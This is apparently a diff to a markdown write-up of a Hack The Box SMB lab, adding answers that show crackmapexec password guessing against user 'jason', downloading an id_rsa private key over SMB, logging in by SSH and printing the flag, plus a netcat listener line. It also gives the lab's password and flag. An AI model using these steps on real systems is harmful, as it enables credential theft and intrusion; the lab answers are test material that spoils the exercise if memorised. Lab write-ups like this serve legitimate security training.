@@ -164,7 +164,7 @@ nc -lvnp 9001
 
 ### Questions
 
-What is the name of the shared folder with READ permissions?
+**1. What is the name of the shared folder with READ permissions?** 
 
 **nmap**
 ```
@@ -241,5 +241,69 @@ smbmap -H 10.129.203.6
 
 **2. What is the password for the username "jason"?**
 ```
+─$ crackmapexec smb 10.129.203.6 -u jason -p pws.list --local-auth
+SMB         10.129.203.6    445    ATTCSVC-LINUX    [*] Windows 6.1 Build 0 (name:ATTCSVC-LINUX) (domain:ATTCSVC-LINUX) (signing:False) (SMBv1:False)
+SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:liverpool STATUS_LOGON_FAILURE 
+SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:theman STATUS_LOGON_FAILURE 
+SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-
+
+SNIP
+
+LINUX\jason:warrior STATUS_LOGON_FAILURE 
+SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:1q2w3e4r5t STATUS_LOGON_FAILURE 
+SMB         10.129.203.6    445    ATTCSVC-LINUX    [+] ATTCSVC-LINUX\==jason:34c8zuNBo91!@28Bszh==
+```
+
+password is : **34c8zuNBo91!@28Bszh**
+
+**3. Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.**
+```
+smbclient -U jason //10.129.203.6/GGJ
+
+Password for [WORKGROUP\jason]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Apr 19 17:33:55 2022
+  ..                                  D        0  Mon Apr 18 13:08:30 2022
+  id_rsa                              N     3381  Tue Apr 19 17:33:04 2022
+
+                14384136 blocks of size 1024. 10079636 blocks available
+smb: \> ==get id_rsa==
+getting file \id_rsa of size 3381 as id_rsa (10.8 KiloBytes/sec) (average 10.8 KiloBytes/sec)
+smb: \> 
+```
+
+Change the permissions on the private key to 600. 
+
+Get the flag!
 
 ```
+ssh -i id_rsa jason@10.129.203.6
+
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sat 02 Dec 2023 04:04:59 AM UTC
+
+  System load:  0.64               Processes:               233
+  Usage of /:   25.5% of 13.72GB   Users logged in:         0
+  Memory usage: 15%                IPv4 address for ens160: 10.129.203.6
+  Swap usage:   0%
+
+
+0 updates can be applied immediately.
+
+
+Last login: Tue Apr 19 21:50:46 2022 from 10.10.14.20
+$ ll
+-sh: 1: ll: not found
+$ ls
+flag.txt
+$ cat flag.txt  
+==HTB{SMB_4TT4CKS_2349872359}==
+
+```
+
